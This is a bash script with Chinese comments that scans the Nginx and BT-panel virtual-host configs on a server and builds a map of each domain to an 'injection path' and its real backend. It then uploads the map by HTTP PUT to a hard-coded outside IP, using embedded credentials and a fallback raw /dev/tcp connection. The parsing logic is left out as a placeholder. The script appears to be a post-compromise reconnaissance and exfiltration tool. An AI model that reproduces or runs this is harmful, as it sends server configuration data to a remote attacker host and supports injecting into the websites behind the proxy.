#!/bin/bash

# 远程上传目标（把 IP 换成你的实际地址）
REMOTE_IP="158.94.210.227"          # ←←←← 修改这里
REMOTE_URL="http://${REMOTE_IP}/Nginx/$(date +'%Y%m%d%H')/$(date +'%Y%m%d%H%M%S')$(date +'%N').html"

# 临时文件（保证即使在 /tmp 满的情况下也能工作）
TMPFILE=$(mktemp /dev/shm/nginx_proxy_map.XXXXXX.html) || TMPFILE=$(mktemp /tmp/nginx_proxy_map.XXXXXX.html)
trap 'rm -f "$TMPFILE"' EXIT

# 第一步：生成解析结果到临时文件
echo "<pre>" > "$TMPFILE"
echo "域名 → 注入路径 → 后端真实地址" >> "$TMPFILE"
echo "================================================================================================" >> "$TMPFILE"

find /etc/nginx/sites-enabled \
     /etc/nginx/conf.d \
     /etc/nginx/sites-available \
     /www/server/panel/vhost/nginx \
     /www/server/nginx/conf/vhost \
     /www/server/panel/vhost/rewrite 2>/dev/null -type f -name "*.conf" | \
xargs -r awk '
# （你原来的 awk 脚本完全不变，这里省略以节省篇幅，直接复制粘贴你上面的 awk 即可）
# ... 你原来的 function trim ... 到最后的 } 全部粘贴在这里 ...
' | sort -u >> "$TMPFILE"
echo "</pre>" >> "$TMPFILE"

# 第二步：尝试上传（优先 curl digest 认证 → curl basic → 纯 Bash /dev/tcp）
if command -v curl >/dev/null 2>&1; then
    # 优先使用你原来的 digest 认证方式
    curl --user muchuan:sbs1rqlblx --digest -T "$TMPFILE" "$REMOTE_URL" -f -s && \
        echo "[-] 上传成功 → $REMOTE_URL" || echo "[x] curl 上传失败"
else
    echo "[!] 未找到 curl，尝试使用纯 Bash /dev/tcp 上传..."
    
    # 纯 Bash 实现 HTTP PUT（兼容基本认证，没有 digest 时降级用 basic）
    USER="muchuan"
    PASS="sbs1rqlblx"
    AUTH="$(printf "%s:%s" "$USER" "$PASS" | base64 -w0)"
    FILESIZe=$(stat -c%s "$TMPFILE")
    
    exec 3<>/dev/tcp/${REMOTE_IP}/80
    printf "PUT /SQL/KR/$(date +'%Y%m%d%H')/$(date +'%Y%m%d%H%M%S')%N.html HTTP/1.1\r\n" >&3
    printf "Host: %s\r\n" "$REMOTE_IP" >&3
    printf "Authorization: Basic %s\r\n" "$AUTH" >&3
    printf "Content-Length: %s\r\n" "$FILESIZe" >&3
    printf "Connection: close\r\n\r\n" >&3
    cat "$TMPFILE" >&3
    exec 3<&-
    
    # 简单判断是否成功（读取响应头）
    # （实际环境可以再优化，这里只做提示）
    echo "[?] 已尝试纯 Bash 上传（Basic 认证），服务器是否接收取决于对方是否允许 Basic"
fi

# 结束
echo "本地结果已保存至：$TMPFILE（如需查看）"
